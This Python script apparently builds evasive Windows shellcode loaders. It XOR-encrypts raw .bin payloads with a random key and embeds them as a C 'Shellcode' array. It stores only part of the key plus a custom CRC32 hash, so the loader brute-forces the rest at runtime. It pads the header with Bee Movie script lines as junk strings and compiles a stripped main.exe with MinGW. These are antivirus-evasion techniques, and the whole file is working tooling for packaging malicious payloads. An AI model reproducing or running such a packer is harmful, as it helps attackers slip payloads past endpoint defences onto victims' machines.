#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
from shutil import copyfile

SEED = 0xdeadbeef

def crc32h_impl(message: bytes, crc: int, i: int) -> int:
    if i >= len(message):
        return (~crc) & 0xFFFFFFFF

    char = message[i]
    crc ^= char
    crc &= 0xFFFFFFFF

    xor_value = 0
    if crc & 1:
        xor_value ^= SEED
    if crc & 2:
        xor_value ^= (SEED >> 1)
    if crc & 4:
        xor_value ^= (SEED >> 2)
    if crc & 8:
        xor_value ^= (SEED >> 3)
    if crc & 16:
        xor_value ^= (SEED >> 4)
    if crc & 32:
        xor_value ^= (SEED >> 5)
    if crc & 64:
        xor_value ^= ((SEED >> 6) ^ SEED)
    if crc & 128:
        xor_value ^= (((SEED >> 6) ^ SEED) >> 1)

    crc = (crc >> 8) ^ xor_value
    crc &= 0xFFFFFFFF

    return crc32h_impl(message, crc, i + 1)

def crc32h(message: bytes) -> int:
    return crc32h_impl(message, 0xFFFFFFFF, 0)

def find_gpp():
    # List of possible g++ executable names
    mingw_options = [
        "g++",
        "g++.exe",
        "mingw32-g++.exe",
        "x86_64-w64-mingw32-g++.exe",
    ]

    # List of common directories to check
    search_paths = [
        "C:/msys64/mingw64/bin/",
        "C:/mingw/bin/",
        "C:/Program Files/CodeBlocks/MinGW/bin/",
        "C:/TDM-GCC-64/bin/",
    ]

    # Add PATH directories
    search_paths.extend(os.environ.get("PATH", "").split(os.pathsep))

    # Remove duplicates and normalize paths
    search_paths = list(set(map(os.path.normpath, search_paths)))

    # Search for the first g++ compiler that exists
    for path in search_paths:
        for m in mingw_options:
            full_path = os.path.join(path, m)
            if os.path.isfile(full_path):
                return f'"{full_path}"'  # Ensure the path is properly quoted

    # Return None if no g++ compiler is found
    return None

def hash_string(message: str) -> int:
    return crc32h(message.encode('ascii'))

def to_char_array(message: str) -> str:
    return ", ".join([f"0x{ord(c):02x}" for c in message])

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    key_length = len(key)
    return bytes(data[i] ^ key[i % key_length] for i in range(len(data)))


def to_code(file_path: str) -> str:
    with open(file_path, 'rb') as file:
        bytesread = file.read()
    bytes_array = [f"0x{byte:02X}" for byte in bytesread]
    bytes_string_final = ', '.join(bytes_array)
    ps_shellcode = f"unsigned char Shellcode[] = {{ {bytes_string_final} }};"
    return ps_shellcode


def process_file(file_path):
    ENC_FILE = f"{file_path}.enc"
    SEED = 0xdeadbeef

    KEY = ''.join(random.choices('0123456789ABCDEF', k=16))
    key_bytes = bytes.fromhex(KEY)

    with open(file_path, 'rb') as file:
        data = file.read()
        encrypted_data = xor_encrypt(data, key_bytes)

    with open(ENC_FILE, 'wb') as enc_file:
        enc_file.write(encrypted_data)
    
    enc_shellcode = to_code(ENC_FILE)
    key_hash = hash_string(KEY)

    shellcode_h = f"#define SEED {SEED}\n"
    shellcode_h += enc_shellcode
    shellcode_h += f"\nunsigned long SHELLCODE_SIZE = sizeof(Shellcode);\n"
    shellcode_h += f"const unsigned int targetHash = {key_hash};\n"
    shellcode_h += f"const char known[] = {{{to_char_array(KEY[:-4])}}};\n"
    with open("./bee_movie.txt", 'r') as file:
        ctr = 1000
        for line in file:
            if ctr == 0:
                break
            ln = line.strip().replace('"', '\\"') # fk C++ strings
            shellcode_h += f'const char * bee_movie_{ctr} = "{ln}";\n'
            ctr -= 1

    out_dir = f"{os.path.basename(file_path)}-{KEY}.out"
    os.mkdir(out_dir)
    with open(f"{out_dir}/Shellcode.h", 'w') as file:
        file.write(shellcode_h)

    src = ['Main.cc', 'makefile']
    for s in src:
        copyfile(s, f"{out_dir}/{s}")

    print(f"Processed {file_path}")
    print(f"Key: {KEY}")
    os.remove(ENC_FILE)

    # compile
    gpp = find_gpp()
    if gpp is None:
        print("g++ not found")
        sys.exit(1)

    os.chdir(out_dir)
    cmd = f"{gpp} -o ./main.exe Main.cc -O2 -std=c++20 -s"
    print(f"Compiling: {cmd}")
    os.system(cmd)
    os.chdir("..")

def main():
    if len(sys.argv) != 3:
        print("Usage:")
        print(f"  {sys.argv[0]} --file <file>")
        print(f"  {sys.argv[0]} --folder <folder>")
        sys.exit(1)

    mode, target = sys.argv[1], sys.argv[2]

    if mode == "--file":
        if not os.path.isfile(target):
            print(f"Error: {target} is not a valid file.")
            sys.exit(1)
        process_file(target)
    elif mode == "--folder":
        if not os.path.isdir(target):
            print(f"Error: {target} is not a valid folder.")
            sys.exit(1)

        for file_name in os.listdir(target):
            if file_name.endswith(".bin"):
                file_path = os.path.join(target, file_name)
                process_file(file_path)
    else:
        print("Invalid option. Use --file or --folder.")
        sys.exit(1)

if __name__ == "__main__":
    main()
